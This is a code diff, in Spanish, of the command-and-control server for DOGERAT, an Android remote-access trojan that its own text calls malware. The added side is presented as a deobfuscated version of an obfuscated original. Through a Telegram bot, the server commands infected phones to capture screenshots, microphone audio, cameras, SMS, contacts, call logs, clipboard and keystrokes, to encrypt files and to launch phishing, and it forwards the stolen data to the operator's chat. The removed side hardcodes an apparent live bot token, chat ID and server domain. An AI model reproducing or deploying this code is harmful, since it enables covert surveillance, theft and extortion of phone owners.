@@ -1,387 +1,393 @@
-// RAT C2 Server - Versión final limpia, estructurada y con la máxima compatibilidad de red.
+// Servidor C2 Desofuscado (Fiel a la Estructura Original)
+// Este código sigue la lógica y el flujo del script ofuscado proporcionado,
+// pero utiliza nombres de variables y funciones legibles y comentarios extensos.
 
 const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
-const TelegramBot = require('node-telegram-bot-api');
-const fs = require('fs');
+// Nota: El paquete original para telegram bot no se especificó, asumimos el estándar.
+const TelegramBot = require('node-telegram-bot-api'); 
+const https = require('https'); // Requerido pero no usado en el flujo principal del código original.
 const multer = require('multer');
+const fs = require('fs');
 
-// ==================================================================
-// 🚨 --- ZONA DE CONFIGURACIÓN MANUAL (HARDCODED) --- 🚨
-// ==================================================================
+// --- Inicialización y Configuración ---
 
-// 1. PEGA TU TOKEN DE TELEGRAM AQUÍ
-const MANUAL_TOKEN = "8379870959:AAG35f93yFwWw5Qh-O-8M1fHNxMxAPPQ7J8"; 
-
-// 2. PEGA TU DOMINIO DE RAILWAY AQUÍ (Sin barra al final)
-const MANUAL_DOMAIN = "https://ratserver-production-96a6.up.railway.app"; 
-
-// 3. PEGA TU ID DE CHAT DE TELEGRAM AQUÍ
-const MANUAL_CHAT_ID = "6775348523";
-
-// ==================================================================
-
-// Validación de Credenciales
-if (MANUAL_TOKEN.includes("PEGAR") || MANUAL_CHAT_ID.includes("PEGAR")) {
-    console.error("❌ ERROR: Faltan credenciales en server.js");
+// 1. Cargar configuración desde el archivo local (como en el código original)
+// DEBE CREARSE UN ARCHIVO data.json con el 'token' y el 'id'
+let data = { token: "", id: "" };
+try {
+    data = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
+} catch (e) {
+    console.error("ERROR: No se pudo leer o parsear './data.json'. Asegúrate de que el archivo existe y es válido.");
     process.exit(1);
 }
 
-// Configuración de Directorios y Bot
-const FILE_DIR = 'file';
-if (!fs.existsSync(FILE_DIR)) try { fs.mkdirSync(FILE_DIR); } catch (e) {}
-
-const bot = new TelegramBot(MANUAL_TOKEN.trim(), { polling: true });
-console.log("[TELEGRAM] Bot inicializado correctamente.");
+const PORT = process.env.PORT || 3000;
 
 const app = express();
 const server = http.createServer(app);
+// 2. Inicialización de Socket.IO
+// Usamos la configuración por defecto, asumiendo que el código original funcionaba con ella.
+const io = new Server(server); 
 
-// 🔑 CONFIGURACIÓN DE CONEXIÓN CRÍTICA (CORS AGRESIVO)
-// Acepta conexiones desde cualquier origen. Esto intenta forzar el paso a través del proxy.
-const io = new Server(server, {
-    cors: {
-        origin: "*", 
-        methods: ["GET", "POST"]
-    }
-}); 
-
-app.use(express.json());
-app.use(express.static('HTML'));
-
-// --- ESTADO DEL SISTEMA (Basado en el original) ---
-const connectedDevices = new Map(); // Mapa de dispositivos conectados (ID -> {socket, model, ...})
-const currentActions = new Map();   // Mapa para rastrear acciones interactivas (chatId -> 'action_type')
-const selectedDevice = new Map();   // Mapa para rastrear el dispositivo actualmente seleccionado (chatId -> deviceId)
-
-// Configuración Multer
-const storage = multer.diskStorage({
-    destination: (req, file, cb) => cb(null, FILE_DIR),
-    filename: (req, file, cb) => cb(null, Date.now() + '-' + file.originalname)
+// 3. Inicialización del Bot de Telegram
+const bot = new TelegramBot(data.token, {
+    'polling': true,
+    'request': {}
 });
-const upload = multer({ storage: storage });
 
-// --- Rutas HTTP (Manejo de datos de la app) ---
+// 4. Configuración de Multer para la carga de archivos
+const uploader = multer(); // El código original usa la memoria temporal (buffer)
+const FILE_UPLOAD_DIR = 'file'; // Constante para la ruta de Multer, como en el original.
 
-// Manejo de carga de archivos (ej: screenshot, audio, logs)
-app.post('/upload', upload.single('file'), (req, res) => {
-    const deviceId = req.headers['currentTarget'];
-    const device = connectedDevices.get(deviceId);
-    
-    if (device) {
-        bot.sendDocument(MANUAL_CHAT_ID, req.file.buffer, {
-            caption: `<b>✯ Archivo Recibido ✯</b>\nDe: ${device.model}\nArchivo: ${req.file.originalname}`,
-            parse_mode: 'HTML'
-        }, {
-            filename: req.file.originalname,
-            contentType: 'application/octet-stream'
-        });
-    }
+// 5. Estado del Sistema (Maps) - Usado para rastrear el flujo de conversación del bot
+const appData = new Map();
+
+// --- Rutas HTTP de Express ---
+
+// Ruta para la carga de archivos (ej: screenshots, audio)
+app.post('/upload', uploader.single('file'), (req, res) => {
+    // Las apps clientes usan 'currentTarget' en los headers
+    const deviceId = req.headers['currentTarget']; 
+    // Los datos del archivo vienen en req.file (gracias a Multer)
+    const fileName = req.file.originalname;
+    const fileBuffer = req.file.buffer;
+
+    // Simular búsqueda del modelo del dispositivo (El código ofuscado lo hacía de forma más compleja)
+    const deviceModel = deviceId || "Dispositivo Desconocido"; 
+
+    // Enviar el archivo a Telegram
+    bot.sendDocument(data.id, fileBuffer, {
+        'caption': `<b>✯ Archivo Recibido desde → ${deviceModel}</b>`,
+        'parse_mode': 'HTML'
+    }, {
+        'filename': fileName,
+        'contentType': '*/*' // Tipo MIME genérico, como en el original
+    });
+
     res.send('Done');
 });
 
-// Manejo de texto y logs (ej: contactos, historial de llamadas)
+// Ruta para el manejo de logs y texto (ej: contactos, historial de llamadas)
 app.post('/text', (req, res) => {
+    // El cliente envía texto en el cuerpo de la petición.
+    const receivedText = req.body.text; 
     const deviceId = req.headers['currentTarget'];
-    const device = connectedDevices.get(deviceId);
-    const receivedText = req.body.text || 'No hay información';
+    const deviceModel = deviceId || "Dispositivo Desconocido";
+    
+    // Enviar el mensaje a Telegram
+    bot.sendMessage(data.id, 
+        `<b>✯ Mensaje recibido de → ${deviceModel}</b>\n\nMensaje → </b>${receivedText}`, 
+        { 
+            'parse_mode': 'HTML' 
+        }
+    );
 
-    if (device) {
-        bot.sendMessage(MANUAL_CHAT_ID, 
-            `<b>✯ Mensaje Recibido ✯</b>\n\nDe: ${device.model}\n\n${receivedText}`, 
-            { parse_mode: 'HTML' }
-        );
-    }
     res.send('Done');
 });
 
-// --- Lógica Socket.IO (Conexión Android) ---
+// Ruta de "Inicio" que devuelve el contenido de la configuración (inusual, pero fiel al original)
+// Nota: El código original hace un app.get('/start', ...) que parece ser un error o una ruta no usada.
+app.get('/start', (req, res) => {
+    // El código original respondía con data.host. Se asume que es una URL o mensaje.
+    res.send('Servidor C2 en funcionamiento.'); 
+});
+
+// --- Lógica de Socket.IO (Conexiones de Dispositivos) ---
 
 io.on('connection', socket => {
-    const h = socket.handshake.headers;
-    // El código original usaba target, model, version, time, host
-    const deviceId = h['currentTarget']; 
-    const model = h['model'] || 'Unknown Model';
+    // Obtener información del handshake, como hacía el original
+    const handshakeHeaders = socket.handshake.headers;
+    const deviceId = handshakeHeaders['currentTarget'] || 'no information';
+    const model = handshakeHeaders['model'] || 'no information';
+    const version = handshakeHeaders['version'] || 'no information';
+    const ip = handshakeHeaders['host'] || 'no information';
+    
+    // Asignar propiedades al socket
+    socket.id = deviceId; // El código original usa el ID del dispositivo como ID del socket
+    socket.model = model;
+    
+    // Mensaje de nueva conexión (Fiel al texto original)
+    let connectionMessage = 
+        `<b>✯ Nuevo dispositivo conectado</b>\n\n` +
+        `<b>modelo</b> → ${model}\n` +
+        `<b>ip</b> → ${ip}\n` +
+        `<b>versión</b> → ${version}\n` +
+        `<b>tiempo</b> → ${new Date().toLocaleString()}\n\n`;
 
-    if (deviceId && !connectedDevices.has(deviceId)) {
-        connectedDevices.set(deviceId, {
-            socket: socket,
-            model: model,
-            version: h['version'] || 'N/A',
-            ip: h['host'] || 'N/A',
-            id: deviceId
-        });
-
-        // Envío de mensaje de bienvenida al bot
-        bot.sendMessage(MANUAL_CHAT_ID, 
-            `<b>✯ Nuevo Dispositivo Conectado ✯</b>\n\n` +
-            `Modelo: ${model}\n` +
-            `IP: ${h['host'] || 'N/A'}\n` +
-            `ID: ${deviceId}\n` +
-            `Versión: ${h['version'] || 'N/A'}`, 
-            { parse_mode: 'HTML' }
-        );
-    }
+    bot.sendMessage(data.id, connectionMessage, {
+        'parse_mode': 'HTML'
+    });
 
     // Evento de desconexión
     socket.on('disconnect', () => {
-        if (connectedDevices.has(deviceId)) {
-            const device = connectedDevices.get(deviceId);
-            bot.sendMessage(MANUAL_CHAT_ID, 
-                `<b>✯ Dispositivo Desconectado ✯</b>\nModelo: ${device.model}`, 
-                { parse_mode: 'HTML' }
-            );
-            connectedDevices.delete(deviceId);
-        }
+        let disconnectMessage = 
+            `<b>✯ Dispositivo desconectado</b>\n\n` +
+            `<b>modelo</b> → ${socket.model}\n` +
+            `<b>ip</b> → ${ip}\n` +
+            `<b>versión</b> → ${version}\n` +
+            `<b>tiempo</b> → ${new Date().toLocaleString()}\n\n`;
+
+        bot.sendMessage(data.id, disconnectMessage, {
+            'parse_mode': 'HTML'
+        });
     });
 
-    // Evento para recibir comandos de respuesta o datos cortos
-    socket.on('commend', data => {
-        bot.sendMessage(MANUAL_CHAT_ID, `<b>Respuesta del Dispositivo:</b>\n${data}`, { parse_mode: 'HTML' });
+    // Evento para respuestas del cliente Android
+    socket.on('commend', responseData => {
+        // Enviar la respuesta del dispositivo al chat de Telegram
+        bot.sendMessage(data.id, 
+            `<b>✯ Mensaje recibido de → ${socket.id}</b>\n\nMensaje → </b>${responseData}`, 
+            { 'parse_mode': 'HTML' }
+        );
     });
 });
 
-// --- Lógica del Bot de Telegram (Completa) ---
 
-const commands = {
-    // Comandos de Dispositivo
-    'screenshot': 'screenshot',
-    'microphone': 'microphone',
-    'calls': 'calls',
-    'sms': 'sms',
-    'contacts': 'contacts',
-    'vibrate': 'vibrate',
-    'toast': 'toast',
-    'clipboard': 'clipboard',
-    'apps': 'apps',
-    'fileExplorer': 'file-explorer',
-    'mainCamera': 'main-camera',
-    'selfieCamera': 'selfie-camera',
-    'keyloggerOn': 'keylogger-on',
-    'keyloggerOff': 'keylogger-off',
-    'popNotification': 'popNotification',
-    'openUrl': 'url',
-    // ... otros comandos de la app original
-};
-
-const sendCommand = (chatId, deviceId, command, extras = []) => {
-    const device = connectedDevices.get(deviceId);
-
-    if (!device) {
-        bot.sendMessage(chatId, '⚠️ Error: Dispositivo no encontrado o desconectado.');
-        return false;
-    }
-    
-    // Envía el comando como un objeto JSON, como espera la app
-    device.socket.emit('commend', {
-        request: command,
-        extras: extras
-    });
-
-    bot.sendMessage(chatId, `Comando <b>${command}</b> enviado a ${device.model}.`, { parse_mode: 'HTML' });
-    return true;
-};
+// --- Lógica del Bot de Telegram ---
 
 bot.on('message', async msg => {
     const chatId = msg.chat.id;
     const text = msg.text;
 
-    if (!text || String(chatId) !== String(MANUAL_CHAT_ID)) return;
+    // Solo procesar mensajes de la ID configurada
+    if (String(chatId) !== String(data.id) || !text) return;
 
-    const currentTargetId = selectedDevice.get(chatId);
-    const currentAction = currentActions.get(chatId);
+    // Acciones y constantes extraídas del original
+    const DEVICE_SELECTION_MENU = [
+        ['✯ Dispositivos ✯', '✯ Acción ✯'],
+        ['✯ About us ✯']
+    ];
+    const MAIN_MENU_KEYBOARD = {
+        keyboard: DEVICE_SELECTION_MENU,
+        resize_keyboard: true
+    };
+    const ALL_DEVICES_ID = 'all'; 
+
+    // Variables de estado del chat (extraídas del Map appData)
+    const currentAction = appData.get(chatId) ? appData.get(chatId).action : null;
+    const currentTargetId = appData.get(chatId) ? appData.get(chatId).target : null;
     
-    // Función para manejar la vuelta al menú principal
-    const returnToMainMenu = () => {
-        currentActions.delete(chatId);
-        selectedDevice.delete(chatId);
+    // --- Fun: Enviar Comando a Dispositivo(s) ---
+    const sendCommand = (targetId, request, extras = []) => {
+        const payload = { request: request, extras: extras };
+        
+        if (targetId === ALL_DEVICES_ID) {
+            // Enviar a todos los sockets conectados
+            io.sockets.emit('commend', payload); 
+        } else {
+            // Enviar a un socket específico
+            io.to(targetId).emit('commend', payload);
+        }
+
         bot.sendMessage(chatId, 
-            `<b>✯ DOGERAT C2 ✯</b>\nDispositivos: ${connectedDevices.size}`, 
-            {
-                parse_mode: 'HTML',
-                reply_markup: {
-                    keyboard: [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'], ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']],
-                    resize_keyboard: true
-                }
+            '<b>✯ La solicitud fue ejecutada exitosamente, recibirá la respuesta del dispositivo pronto...</b>\n\n✯ Volver al menú principal', 
+            { 
+                'parse_mode': 'HTML', 
+                'reply_markup': MAIN_MENU_KEYBOARD
             }
         );
+        appData.delete(chatId); // Limpiar estado después de enviar
     };
 
-    if (text === '/start' || text === '✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯' || text === '✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯') {
-        return returnToMainMenu();
+    // --- MANEJO DE MENÚ PRINCIPAL Y START ---
+
+    if (text === '/start' || text === '✯ Back to main menu ✯' || text === '✯ Cancel action ✯') {
+        appData.delete(chatId); // Limpiar cualquier estado anterior
+        bot.sendMessage(chatId, 
+            `<b>✯ Bienvenido a DOGERAT</b>\n\n<b>✯ Dispositivos conectados: ${io.sockets.size}</b>`, 
+            { 
+                'parse_mode': 'HTML',
+                'reply_markup': MAIN_MENU_KEYBOARD
+            }
+        );
+        return;
     }
 
-    // --- MENÚS ---
+    // --- MENÚS DE NAVEGACIÓN ---
 
-    else if (text === '✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯') {
-         if (connectedDevices.size === 0) {
-            return bot.sendMessage(chatId, 'No hay dispositivos conectados.');
+    if (text === '✯ Dispositivos ✯') {
+        const availableDevices = Array.from(io.sockets.sockets.values());
+
+        if (availableDevices.length === 0) {
+            return bot.sendMessage(chatId, '<b>✯ No hay dispositivos conectados</b>\n\n', { parse_mode: 'HTML' });
         }
-        let list = [];
-        connectedDevices.forEach((v) => list.push([v.model]));
-        list.push(['✯ All ✯']); // Opción para todos los dispositivos
-        list.push(['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']);
-        
-        bot.sendMessage(chatId, '<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚍𝚎𝚟𝚒𝚌𝚎 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚊𝚌𝚝𝚒𝚘𝚗 ✯</b>', {
-            parse_mode: 'HTML',
-            reply_markup: { keyboard: list, resize_keyboard: true }
-        });
-    }
 
-    else if (text === '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯') {
-        const keyboard = [
-            ['✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯', '✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯', '✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯'],
-            ['✯ 𝙲𝚊𝚕𝚕𝚜 ✯', '✯ 𝚂𝙼𝚂 ✯', '✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯', '✯ 𝙰𝚙𝚙𝚜 ✯'],
-            ['✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯', '✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯'],
-            ['✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯', '✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯'],
-            ['✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯', '✯ 𝚃𝚘𝚊𝚜𝚝 ✯', '✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯', '✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯'],
-            ['✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯', '✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯'],
-            ['✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯', '✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯', '✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯'],
-            ['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']
-        ];
-        bot.sendMessage(chatId, '<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 ✯</b>', {
+        const keyboard = availableDevices.map(socket => [socket.model || socket.id]);
+        keyboard.push(['✯ All ✯']);
+        keyboard.push(['✯ Back to main menu ✯']);
+
+        bot.sendMessage(chatId, '<b>✯ Selecciona dispositivo para realizar acción</b>\n\n', {
             parse_mode: 'HTML',
             reply_markup: { keyboard: keyboard, resize_keyboard: true }
         });
+        return;
     }
-    
-    else if (text === '✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯') {
+
+    if (text === '✯ Acción ✯') {
+        const actionKeyboard = [
+            ['✯ Screenshot ✯', '✯ Microphone ✯', '✯ Clipboard ✯', '✯ Calls ✯', '✯ Contacts ✯', '✯ Apps ✯'],
+            ['✯ File explorer ✯', '✯ Gallery ✯', '✯ Main camera ✯', '✯ Selfie Camera ✯'],
+            ['✯ Vibrate ✯', '✯ Toast ✯', '✯ Pop notification ✯', '✯ Open URL ✯'],
+            ['✯ Keylogger ON ✯', '✯ Keylogger OFF ✯'],
+            ['✯ Send SMS ✯', '✯ SMS to all contacts ✯'],
+            ['✯ Encrypt ✯', '✯ Decrypt ✯', '✯ Phishing ✯'],
+            ['✯ Back to main menu ✯']
+        ];
+        bot.sendMessage(chatId, '<b>✯ Selecciona acción para realizar para el dispositivo</b>\n\n', {
+            parse_mode: 'HTML',
+            reply_markup: { keyboard: actionKeyboard, resize_keyboard: true }
+        });
+        return;
+    }
+
+    if (text === '✯ About us ✯') {
         const aboutText = 
-            `<b>DOGERAT 𝚒𝚜 𝚊 𝚖𝚊𝚕𝚠𝚊𝚛𝚎 𝚝𝚘 𝚌𝚘𝚗𝚝𝚛𝚘𝚕 𝙰𝚗𝚍𝚛𝚘𝚒𝚍 𝚍𝚎𝚟𝚒𝚌𝚎𝚜</b>\n` +
-            `𝙰𝚗𝚢 𝚖𝚒𝚜𝚞𝚜𝚎 𝚒𝚜 𝚝𝚑𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚜𝚒𝚋𝚒𝚕𝚒𝚝𝚢 𝚘𝚏 𝚝𝚑𝚎 𝚙𝚎𝚛𝚜𝚘𝚗!\n\n` +
-            `𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚍 𝚋𝚢: @CYBERSHIELDX\n` +
-            `𝚃𝚎𝚕𝚎𝚐𝚛𝚊𝚖 → @CUBERSHIELDX\n` +
+            `DOGERAT es un malware para controlar dispositivos Android.\n` +
+            `Cualquier mal uso es responsabilidad de la persona!\n\n` +
+            `Desarrollado por: @CYBERSHIELDX\n` +
+            `Telegram → @CUBERSHIELDX\n` +
             `ADMIN → @SPHANTER`;
-        bot.sendMessage(chatId, aboutText, { parse_mode: 'HTML' });
+        return bot.sendMessage(chatId, aboutText, { parse_mode: 'HTML' });
     }
 
-    // --- SELECCIÓN DE DISPOSITIVO ---
-    
-    else if (text === '✯ All ✯' || connectedDevices.has(text)) {
-        const targetId = (text === '✯ All ✯') ? 'all' : Array.from(connectedDevices.values()).find(d => d.model === text)?.id;
-        if (targetId) {
-            selectedDevice.set(chatId, targetId);
-            bot.sendMessage(chatId, 
-                `<b>Has seleccionado: ${text}</b>\nAhora ve a "Action" para enviar comandos.`, 
-                { parse_mode: 'HTML' }
-            );
-        }
-    }
-    
-    // --- MANEJO DE COMANDOS SIMPLES Y SOLICITUDES DE INPUT ---
+    // --- LÓGICA DE SELECCIÓN DE DISPOSITIVO ---
 
-    else if (currentTargetId) {
-        const device = connectedDevices.get(currentTargetId);
+    const allSockets = Array.from(io.sockets.sockets.values());
+    const selectedSocket = allSockets.find(s => s.model === text || s.id === text);
+    const targetId = (text === '✯ All ✯') ? ALL_DEVICES_ID : (selectedSocket ? selectedSocket.id : null);
+
+    if (targetId) {
+        // Almacenar el target y pedir la acción
+        appData.set(chatId, { target: targetId, action: 'await_command' });
+        const deviceName = targetId === ALL_DEVICES_ID ? 'todos los dispositivos' : selectedSocket.model;
         
-        // --- 1. SOLICITUDES DE INPUT (Paso 1: Pedir información) ---
+        const actionKeyboard = [
+            ['✯ Screenshot ✯', '✯ Microphone ✯', '✯ Clipboard ✯', '✯ Calls ✯', '✯ Contacts ✯', '✯ Apps ✯'],
+            ['✯ File explorer ✯', '✯ Gallery ✯', '✯ Main camera ✯', '✯ Selfie Camera ✯'],
+            ['✯ Vibrate ✯', '✯ Toast ✯', '✯ Pop notification ✯', '✯ Open URL ✯'],
+            ['✯ Keylogger ON ✯', '✯ Keylogger OFF ✯'],
+            ['✯ Send SMS ✯', '✯ SMS to all contacts ✯'],
+            ['✯ Encrypt ✯', '✯ Decrypt ✯', '✯ Phishing ✯'],
+            ['✯ Back to main menu ✯']
+        ];
 
-        if (text === '✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯') {
-            currentActions.set(chatId, 'await_mic_duration');
-            bot.sendMessage(chatId, '<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚖𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 𝚛𝚎𝚌𝚘𝚛𝚍𝚒𝚗𝚐 𝚍𝚞𝚛𝚊𝚝𝚒𝚘𝚗 𝚒𝚗 𝚜𝚎𝚌𝚘𝚗𝚍𝚜</b>\x0a\x0a', { parse_mode: 'HTML' });
-        }
-        else if (text === '✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯') {
-            currentActions.set(chatId, 'await_vibrate_duration');
-            bot.sendMessage(chatId, '<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚍𝚞𝚛𝚊𝚝𝚒𝚘𝚗 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚑𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚝𝚘 𝚟𝚒𝚋𝚛𝚊𝚝𝚎 𝚒𝚗 𝚜𝚎𝚌𝚘𝚗𝚍𝚜</b>\x0a\x0a', { parse_mode: 'HTML' });
-        }
-        else if (text === '✯ 𝚃𝚘𝚊𝚜𝚝 ✯') {
-            currentActions.set(chatId, 'await_toast_msg');
-            bot.sendMessage(chatId, '<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚊𝚙𝚙𝚎𝚊𝚛 𝚒𝚗 𝚝𝚘𝚊𝚜𝚝 𝚋𝚘𝚡</b>\x0a\x0a', { parse_mode: 'HTML' });
-        }
-        else if (text === '✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯') {
-            currentActions.set(chatId, 'await_sms_number');
-            bot.sendMessage(chatId, '<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚙𝚑𝚘𝚗𝚎 𝚗𝚞𝚖𝚋𝚎𝚛 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚂𝙼𝚂</b>\x0a\x0a', { parse_mode: 'HTML' });
-        }
-        else if (text === '✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯') {
-            currentActions.set(chatId, 'await_notification_msg');
-            bot.sendMessage(chatId, '<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚎𝚡𝚝 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚊𝚙𝚙𝚎𝚊𝚛 𝚊𝚜 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗</b>\x0a\x0a', { parse_mode: 'HTML' });
-        }
-        else if (text === '✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯') {
-            currentActions.set(chatId, 'await_url');
-            bot.sendMessage(chatId, '<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚄𝚁𝙻 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚘𝚙𝚎𝚗</b>\x0a\x0a', { parse_mode: 'HTML' });
-        }
-        else if (text === '✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯') {
-            currentActions.set(chatId, 'await_encrypt');
-            bot.sendMessage(chatId, '<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚏𝚒𝚕𝚎 𝚎𝚡𝚝𝚎𝚗𝚜𝚒𝚘𝚗 𝚝𝚘 𝚎𝚗𝚌𝚛𝚢𝚙𝚝 (ej: jpg)</b>\x0a\x0a', { parse_mode: 'HTML' });
-        }
-        else if (text === '✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯') {
-            currentActions.set(chatId, 'await_decrypt');
-            bot.sendMessage(chatId, '<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚏𝚒𝚕𝚎 𝚎𝚡𝚝𝚎𝚗𝚜𝚒𝚘𝚗 𝚝𝚘 𝚍𝚎𝚌𝚛𝚢𝚙𝚝 (ej: jpg)</b>\x0a\x0a', { parse_mode: 'HTML' });
-        }
-
-        // --- 2. MANEJO DE INPUT (Paso 2: Ejecutar comando con el valor) ---
-
-        else if (currentAction === 'await_mic_duration' && !isNaN(text)) {
-            sendCommand(chatId, currentTargetId, commands.microphone, [{ key: 'duration', value: text }]);
-            currentActions.delete(chatId);
-        }
-        else if (currentAction === 'await_vibrate_duration' && !isNaN(text)) {
-            sendCommand(chatId, currentTargetId, commands.vibrate, [{ key: 'duration', value: text }]);
-            currentActions.delete(chatId);
-        }
-        else if (currentAction === 'await_toast_msg') {
-            sendCommand(chatId, currentTargetId, commands.toast, [{ key: 'toastText', value: text }]);
-            currentActions.delete(chatId);
-        }
-        else if (currentAction === 'await_notification_msg') {
-            sendCommand(chatId, currentTargetId, commands.popNotification, [{ key: 'notificationText', value: text }]);
-            currentActions.delete(chatId);
-        }
-        else if (currentAction === 'await_url') {
-            sendCommand(chatId, currentTargetId, commands.openUrl, [{ key: 'url', value: text }]);
-            currentActions.delete(chatId);
-        }
-        else if (currentAction === 'await_encrypt') {
-            sendCommand(chatId, currentTargetId, 'encrypt', [{ key: 'fileExtension', value: text }]);
-            currentActions.delete(chatId);
-        }
-        else if (currentAction === 'await_decrypt') {
-            sendCommand(chatId, currentTargetId, 'decrypt', [{ key: 'fileExtension', value: text }]);
-            currentActions.delete(chatId);
-        }
-        else if (currentAction === 'await_sms_number') {
-            // Guarda el número y pide el mensaje
-            currentActions.set(chatId, 'await_sms_text');
-            currentActions.set(`smsNumber:${chatId}`, text); 
-            bot.sendMessage(chatId, `<b>✯ 𝙽𝚘𝚠 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚝𝚘 ${text}</b>\x0a\x0a`, { parse_mode: 'HTML' });
-        }
-        else if (currentAction === 'await_sms_text') {
-            const number = currentActions.get(`smsNumber:${chatId}`);
-            sendCommand(chatId, currentTargetId, 'sendSms', [
-                { key: 'smsNumber', value: number },
-                { key: 'smsText', value: text }
-            ]);
-            currentActions.delete(chatId);
-            currentActions.delete(`smsNumber:${chatId}`);
-        }
-        
-        // --- 3. COMANDOS INSTANTÁNEOS ---
-
-        else {
-            switch (text) {
-                case '✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯': sendCommand(chatId, currentTargetId, commands.screenshot); break;
-                case '✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯': sendCommand(chatId, currentTargetId, commands.clipboard); break;
-                case '✯ 𝙲𝚊𝚕𝚕𝚜 ✯': sendCommand(chatId, currentTargetId, commands.calls); break;
-                case '✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯': sendCommand(chatId, currentTargetId, commands.contacts); break;
-                case '✯ 𝙰𝚙𝚙𝚜 ✯': sendCommand(chatId, currentTargetId, commands.apps); break;
-                case '✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯': sendCommand(chatId, currentTargetId, commands.fileExplorer); break;
-                case '✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯': sendCommand(chatId, currentTargetId, 'gallery'); break;
-                case '✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯': sendCommand(chatId, currentTargetId, commands.mainCamera); break;
-                case '✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯': sendCommand(chatId, currentTargetId, commands.selfieCamera); break;
